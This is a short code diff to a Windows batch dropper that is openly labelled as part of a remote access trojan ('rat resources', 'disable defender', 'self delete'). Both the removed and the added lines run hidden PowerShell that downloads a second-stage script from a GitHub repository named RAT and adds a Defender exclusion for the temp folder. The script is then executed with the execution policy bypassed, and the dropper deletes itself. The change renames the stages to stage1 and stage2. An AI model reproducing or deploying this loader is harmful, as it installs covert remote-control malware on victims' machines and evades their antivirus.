@@ -34,8 +34,8 @@ if '%errorlevel%' NEQ '0' (
 @REM disable defender
 
 @REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "$env:temp"
-powershell powershell.exe -windowstyle hidden -ep bypass ./installer.ps1
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/stage2.ps1 -OutFile stage2.ps1"; Add-MpPreference -ExclusionPath "$env:temp"
+powershell powershell.exe -windowstyle hidden -ep bypass ./stage2.ps1
 
 @REM self delete
-del wget.cmd
+del stage1.cmd
